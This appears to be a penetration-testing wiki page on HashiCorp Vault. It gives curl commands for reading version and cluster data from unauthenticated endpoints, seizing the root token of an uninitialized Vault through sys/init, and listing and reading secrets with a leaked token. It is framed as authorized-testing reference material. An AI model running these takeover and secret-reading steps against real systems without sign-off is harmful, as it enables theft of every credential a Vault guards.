---
service: vault
title: HashiCorp Vault
ports: 8200, 8201
aliases: vault
---

# HashiCorp Vault — quick wins

**When you see it:** 8200/tcp open and `/v1/sys/seal-status` returns JSON → a Vault server.
There's no default-credential class here, but the unauthenticated `seal-status`/`health`
endpoints leak the exact version and cluster topology (map to CVEs), and an **uninitialized**
Vault is a land-grab: the first caller to `POST /v1/sys/init` owns the root token and unseal
keys.

> Authorized testing only. Triage is read-only (GET on `sys/*`). Initializing an uninitialized
> Vault (marked ✏️) creates root credentials and changes state — only with explicit sign-off,
> and record/return the keys per the engagement's handling rules.

## Triage (read-only)
```sh
curl -sk https://H:8200/v1/sys/seal-status | python3 -m json.tool   # version, sealed, cluster
curl -sk https://H:8200/v1/sys/health                              # init/sealed/standby flags
curl -sk https://H:8200/v1/sys/init                                # {"initialized":true|false}
curl -sk https://H:8200/v1/sys/leader                              # HA leader / cluster addr
```

## Quick wins

### Version + cluster leak (even when sealed)
```sh
curl -sk https://H:8200/v1/sys/seal-status | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("version"),d.get("cluster_name"),"sealed=",d.get("sealed"))'
```
*Why:* `seal-status` is unauthenticated and returns the exact Vault version and cluster name
even on a fully sealed vault — map the version to CVEs (e.g. CVE-2020-16250/16251 AWS-auth
bypass on old builds, CVE-2021-27668 policy bypass) and scope the cluster.

### Uninitialized Vault — seize root ✏️
```sh
curl -sk https://H:8200/v1/sys/init            # {"initialized":false} = up for grabs
# initialize and capture root token + unseal keys (WRITES state):
curl -sk -X PUT https://H:8200/v1/sys/init -d '{"secret_shares":1,"secret_threshold":1}'
```
*Why:* an uninitialized Vault has no owner — whoever calls `/v1/sys/init` first receives the
root token and unseal key(s) and controls every secret the vault will ever hold. Rare but
catastrophic; the read-side `init` check tells you if it applies.

### Authenticated enumeration (if you have a token)
```sh
curl -sk -H "X-Vault-Token: TOKEN" https://H:8200/v1/sys/mounts        # secret engines
curl -sk -H "X-Vault-Token: TOKEN" https://H:8200/v1/sys/auth          # auth methods
curl -sk -H "X-Vault-Token: TOKEN" "https://H:8200/v1/secret/data/PATH"
```
*Why:* a token leaked from KV/env/CI unlocks the mounted secret engines — `sys/mounts` lists
them, then read the KV paths directly. Tokens are the whole game with Vault.

## aranum helpers
- `aranumtoolkit/network/enum-vault.sh` — dispatcher (`sys/seal-status` version/cluster/sealed, `sys/health`, `sys/init` state; tries http + https, two-evidence discipline).

## Gotchas
- A **sealed** vault leaks version/topology but won't serve secrets until unsealed with the key shares — note the version and move on.
- No default creds: brute-forcing a root token is infeasible — the real paths are an uninitialized vault, a leaked token, or a version-specific auth CVE.
- 8201 is the cluster/replication port (server-to-server), not for client reads — target 8200.
- Vault fronted by Consul (`wiki/consul.md`) sometimes has tokens/secrets sitting in the Consul KV — check there too.

## Sources
- Vault `sys/seal-status` / `sys/init` API docs; CVE-2020-16250/16251, CVE-2021-27668 advisories; aranum `enum-vault.sh` header notes.
